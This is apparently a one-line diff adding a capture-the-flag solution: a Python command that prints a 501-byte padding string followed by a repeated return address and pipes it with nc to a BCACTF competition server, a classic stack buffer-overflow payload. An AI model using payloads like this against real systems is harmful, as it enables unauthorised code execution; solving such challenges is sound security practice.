@@ -1,0 +1,2 @@
+python3 -c 'print("a"*501+"\xb6\x11\x40\x00\x00\x00\x00\x00"*3)' | nc bin.bcactf.com 49177
+
